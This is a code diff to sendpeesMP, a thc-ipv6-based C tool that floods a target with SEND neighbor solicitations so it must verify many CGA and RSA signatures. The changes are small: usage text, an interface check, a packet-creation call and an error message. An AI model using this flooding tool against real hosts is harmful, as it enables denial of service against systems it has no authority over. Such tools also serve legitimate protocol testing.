@@ -69,7 +69,7 @@ int main(int argc, char **argv) {
   if (argc != 5) {
     printf("original sendpees by willdamn <willdamn@gmail.com>\n");
     printf("modified sendpeesMP by Marcin Pohl <marcinpohl@gmail.com>\nCode based on thc-ipv6\n\n");
-    printf("usage: %s <inferface> <key_length> <prefix> <victim>\n\n", argv[0]);
+    printf("Syntax: %s interface key_length prefix victim\n\n", argv[0]);
     printf("Send SEND neighbor solicitation messages and make target to verify a lota CGA and RSA signatures\n");
     printf("Example: %s eth0 2048 fe80:: fe80::1\n\n", argv[0]);
     exit(1);
@@ -80,6 +80,10 @@ int main(int argc, char **argv) {
   dev = argv[1];                /* read interface from commandline */
   if ((addr = thc_resolve6(argv[3])) == NULL) {
     fprintf(stderr, "Error: %s does not resolve to a valid IPv6 address\n", argv[3]);
+    exit(-1);
+  }
+  if (thc_get_own_ipv6(dev, NULL, PREFER_LINK) == NULL) {
+    fprintf(stderr, "Error: invalid interface %s\n", dev);
     exit(-1);
   }
 
@@ -139,7 +143,7 @@ int main(int argc, char **argv) {
       result = fread((char *) &test[3], 1, 3, fp);
 
 /* create IPv6 portion */
-      if ((pkt = thc_create_ipv6(dev, PREFER_LINK, &pkt_len, cga, dst6, 0, 0, 0, 0, 0)) == NULL) {
+      if ((pkt = thc_create_ipv6_extended(dev, PREFER_LINK, &pkt_len, cga, dst6, 0, 0, 0, 0, 0)) == NULL) {
         printf("Cannot create IPv6 header\n");
         exit(1);
       }
@@ -158,7 +162,7 @@ int main(int argc, char **argv) {
 
 /* attach the IPv6+ICMPv6+SeND to an Ethernet frame with random MAC */
       if ((result = thc_generate_pkt(dev, test, tgthw, pkt, &pkt_len)) < 0) {
-        fprintf(stderr, "Couldn't generate ipv6 packet, error num %d !\n", result);
+        fprintf(stderr, "Couldn't generate IPv6 packet, error num %d !\n", result);
         exit(1);
       }
 
